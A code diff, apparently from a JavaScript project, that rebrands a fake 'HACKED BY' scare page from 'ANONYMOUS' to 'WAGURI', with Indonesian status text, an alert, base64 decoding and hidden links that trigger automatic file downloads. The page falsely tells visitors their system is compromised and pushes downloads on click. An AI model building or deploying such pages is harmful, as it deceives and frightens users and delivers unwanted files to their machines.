@@ -123,7 +123,7 @@ const payloadText = "<!DOCTYPE html>" +
 "<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
 "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
 "<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
-"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>ANONYMOUS</h2>" +
+"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
 "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
 "<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
 "<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik di mana saja untuk memulai download</p>" +
@@ -137,7 +137,7 @@ const payloadText = "<!DOCTYPE html>" +
 "(function(){" +
 "\"use strict\";" +
 "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
-"try { alert('HACKED BY ANONYMOUS'); } catch(e){}" +
+"try { alert('HACKED BY WAGURI'); } catch(e){}" +
 "function b64KeBytes(b64){" +
 "var binary = atob(b64);" +
 "var len = binary.length;" +
@@ -195,7 +195,7 @@ resolve({ id: i, url: url });
 const triggerInstantDownload = (fileData) => {
 const link = document.createElement("a");
 link.href = fileData.url;
-link.download = `test-file-${fileData.id}.txt`;
+link.download = `waguri-file-${fileData.id}.txt`;
 link.textContent = `Blob #${fileData.id} (.txt)`;
 link.style.display = "none";
 downloadsDiv.appendChild(link);
